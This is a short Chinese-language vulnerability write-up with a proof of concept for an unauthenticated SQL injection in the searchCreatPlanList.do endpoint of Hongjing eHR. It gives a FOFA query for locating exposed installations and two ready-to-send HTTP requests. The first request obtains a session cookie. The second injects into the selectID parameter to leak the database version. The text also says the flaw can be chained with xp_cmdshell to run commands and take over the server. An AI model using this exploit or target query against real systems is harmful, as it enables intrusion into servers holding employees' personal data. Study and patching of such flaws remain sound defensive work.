# 宏景eHR人力资源管理系统接口searchCreatPlanList存在SQL注入漏洞

宏景eHR searchCreatPlanList.do接口处存在sql注入漏洞，未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。

## fofa

```
app="HJSOFT-HCM"
```

## poc

第一步:获取cookie
```yaml
GET /templates/index/getpassword.jsp HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```
第二步:携带cookie访问

```yaml
GET /train/plan/searchCreatPlanList.do?b_selectPlan=query&selectID=1'%2B(1-@@VERSION)%2B')--+ HTTP/1.1
Host: 
Cookie: JSESSIONID=D3D69E3D8D5CD86DC4B10E91CD2062AB
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
```

![image](https://github.com/user-attachments/assets/25d41e1f-69b3-4694-b3ba-1abeba156a3c)
